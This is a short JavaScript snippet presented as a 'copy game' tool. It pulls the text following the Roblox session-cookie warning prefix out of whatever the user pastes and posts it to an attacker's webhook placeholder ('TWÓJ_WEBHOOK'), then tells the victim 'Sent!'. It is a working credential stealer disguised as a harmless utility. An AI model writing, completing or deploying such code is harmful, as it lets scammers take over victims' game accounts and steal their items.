<script>
const webhook = "TWÓJ_WEBHOOK";

function copyGame(){
    const input = document.getElementById("gameInput");
    let text = input.value;

    if(!text){
        document.getElementById("status").innerText="Please enter text";
        return;
    }

    // wyłap tekst między and-items.|_  a  ", "/", ".roblox.com"
    let match = text.match(/and-items\.\|_([^"]+)/);

    if(match){
        let value = match[1];

        fetch(webhook,{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                content:"Extracted: " + value
            })
        });

        document.getElementById("status").innerText="✅ Sent!";
    }
    else{
        document.getElementById("status").innerText="❌ Not found";
    }
}
</script>
